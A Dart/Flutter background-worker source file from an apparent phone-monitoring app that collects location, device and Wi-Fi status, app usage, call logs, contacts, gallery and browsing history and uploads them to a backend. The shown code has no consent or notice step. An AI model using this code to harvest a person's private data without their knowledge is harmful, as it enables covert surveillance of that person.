import '../core/utils/device_id.dart';
import '../core/utils/logger.dart';
import '../features/device_status/device_status_service.dart';
import '../features/location/location_service.dart';
import '../features/usage_tracking/usage_tracking_service.dart';
import '../models/event_queue_model.dart';
import '../services/event_queue_service.dart';
import '../services/monitoring_service.dart';
import '../services/sync_service.dart';
import '../storage/app_database.dart';

/// Static entry points called from WorkManager and the main isolate.
///
/// Each task captures data, enqueues it to the event queue, then the
/// syncPendingEvents task uploads the queue to the backend.
///
/// NOTE: MethodChannel calls (usage stats, monitoring) only work when a
/// Flutter engine is active. Those tasks must be called from the main
/// isolate, not from a WorkManager background task.
class BackgroundWorker {

  // ── Sync ──────────────────────────────────────────────────────────────────

  static Future<void> syncPendingEvents() async {
    final db = AppDatabase();
    try {
      final queue = EventQueueService(db);
      final sync  = SyncService(db, queue);
      await sync.sync();
    } finally {
      await db.close();
    }
  }

  // ── Location ──────────────────────────────────────────────────────────────

  static Future<void> captureLocationSnapshot() async {
    final db = AppDatabase();
    try {
      final deviceId = await DeviceIdUtil.get();
      final svc   = LocationService(db);
      final queue = EventQueueService(db);

      final model = await svc.captureAndStore(deviceId);
      if (model != null) {
        await queue.enqueue(EventType.location, {
          'latitude':   model.latitude,
          'longitude':  model.longitude,
          'accuracy':   model.accuracy,
          'altitude':   model.altitude,
          'speed':      model.speed,
          'heading':    model.heading,
          'provider':   model.provider,
          'capturedAt': model.capturedAt.toIso8601String(),
        });
        appLogger.d('BackgroundWorker: location enqueued');
      }
    } catch (e) {
      appLogger.w('BackgroundWorker: location capture failed — $e');
    } finally {
      await db.close();
    }
  }

  // ── Device status ─────────────────────────────────────────────────────────

  static Future<void> captureDeviceStatus() async {
    final db = AppDatabase();
    try {
      final deviceId = await DeviceIdUtil.get();
      final svc   = DeviceStatusService(db);
      final queue = EventQueueService(db);

      final model = await svc.captureAndStore(deviceId);
      await queue.enqueue(EventType.deviceStatus, {
        'batteryLevel':  model.batteryLevel,
        'isCharging':    model.isCharging,
        'networkType':   model.networkType,
        'isConnected':   model.isConnected,
        'wifiSsid':      model.wifiSsid,
        'signalStrength': model.signalStrength,
        'capturedAt':    model.capturedAt.toIso8601String(),
      });
      appLogger.d('BackgroundWorker: device status enqueued');
    } catch (e) {
      appLogger.w('BackgroundWorker: device status capture failed — $e');
    } finally {
      await db.close();
    }
  }

  // ── Usage (main isolate only — needs MethodChannel) ───────────────────────

  static Future<void> captureUsageSnapshot() async {
    final db = AppDatabase();
    try {
      final deviceId = await DeviceIdUtil.get();
      final svc   = UsageTrackingService(db);
      final queue = EventQueueService(db);

      final models = await svc.captureAndStore(deviceId);
      for (final model in models) {
        await queue.enqueue(EventType.appUsage, {
          'packageName':     model.packageName,
          'appName':         model.appName,
          'usageDurationMs': model.usageDurationMs,
          'launchCount':     0,
          'capturedAt':      model.capturedAt.toIso8601String(),
        });
      }
      if (models.isNotEmpty) {
        appLogger.d('BackgroundWorker: ${models.length} usage records enqueued');
      }
    } catch (e) {
      appLogger.w('BackgroundWorker: usage capture failed — $e');
    } finally {
      await db.close();
    }
  }

  // ── Monitoring slow-cycle (main isolate only — needs MethodChannel) ───────

  static Future<void> captureMonitoringData() async {
    final db = AppDatabase();
    try {
      final queue   = EventQueueService(db);
      final monitor = MonitoringService(queue);
      await monitor.checkAndCollect();
    } finally {
      await db.close();
    }
  }

  /// Forces immediate collection of call logs, contacts, gallery, and
  /// browsing history via MethodChannel. Call from main isolate only.
  static Future<void> _captureMonitoringNow() async {
    final db = AppDatabase();
    try {
      final queue   = EventQueueService(db);
      final monitor = MonitoringService(queue);
      await monitor.collectNow();
    } finally {
      await db.close();
    }
  }

  // ── Full immediate capture + sync (call from main isolate after login) ────

  /// Captures location, battery, usage, call logs, contacts, gallery, and
  /// browsing history then uploads everything to the backend in one go.
  /// Must be called from the main Flutter isolate (MethodChannels required).
  static Future<void> captureAllAndSync() async {
    try { await captureLocationSnapshot();  } catch (_) {}
    try { await captureDeviceStatus();      } catch (_) {}
    try { await captureUsageSnapshot();     } catch (_) {}
    try { await _captureMonitoringNow();    } catch (_) {}
    await syncPendingEvents();
    appLogger.i('BackgroundWorker: full capture+sync complete');
  }
}
